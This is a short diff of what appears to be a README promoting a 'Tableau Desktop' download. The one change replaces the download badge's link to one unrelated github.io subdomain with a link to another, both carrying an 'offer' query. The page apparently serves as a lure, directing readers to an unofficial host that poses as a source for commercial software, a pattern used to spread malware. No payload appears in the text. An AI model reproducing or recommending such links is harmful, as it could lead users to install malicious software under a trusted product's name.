@@ -3,7 +3,7 @@
 **Tableau Desktop** transforms data into clear, interactive visuals — available for **macOS** and **Windows**.  
 Analyze, explore, and share insights faster with powerful dashboards and AI-driven recommendations, all while running natively on your favorite OS. 💻🍎  
 
-[![🟣 Get GitHub App](https://img.shields.io/badge/🟣%20Get%20Tableau%20Desktop-7E57C2?style=for-the-badge&logo=github&logoColor=white)](https://app-dep-load.github.io/.github/?offer=TableauDesktop)
+[![🟣 Get GitHub App](https://img.shields.io/badge/🟣%20Get%20Tableau%20Desktop-7E57C2?style=for-the-badge&logo=github&logoColor=white)](https://hubset-desk.github.io/.github/?offer=TableauDesktop)
 
 ---
 
